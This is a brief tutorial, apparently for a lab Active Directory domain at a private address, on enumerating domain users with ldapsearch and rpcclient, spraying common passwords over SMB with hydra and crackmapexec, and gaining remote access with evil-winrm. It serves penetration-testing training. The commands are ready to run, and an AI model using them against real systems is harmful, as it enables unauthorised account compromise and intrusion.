# Creating User Files and Running Password Spraying Attacks

## 1) Creating User Files
From enumeration, we can gather the user information using either `ldapsearch` or `rpcclient`.

### Using `ldapsearch`:
```bash
ldapsearch -H ldap://192.168.56.107 -x -b"DC=skypia,DC=org" '(objectClass=User)' "sAMAccountName" | grep "sAMAccountName"
```

### Using `rpcclient`:
```bash
rpcclient -U "jemmie.blondell" 192.168.56.107
```
Then type `enumdomusers` to list the users.

After gathering the usernames, save them with this command:
```bash
cut -d':' -f2 input_file > output_file
```

## 2) Create a Password File with a Few Passwords
Create a password file with common passwords like:
- qwerty123
- happy
- summer
- passw0rd
- winter

## 3) Run Spraying Attacks for Different Services

Use `hydra` to perform password spraying for SMB service:
```bash
hydra -L users.txt -P password.txt -s 445 smb://192.168.56.107
```

Alternatively, use `crackmapexec`:
```bash
crackmapexec smb 192.168.56.107 -u users.txt -p password.txt --continue-on-success
```

## 4) Repeat the Process
Repeat the attack a couple of times. Once you get a valid password, use `evil-winrm` for remote access:

```bash
evil-winrm -i 192.168.56.107 -u <valid_user> -p <password>
```

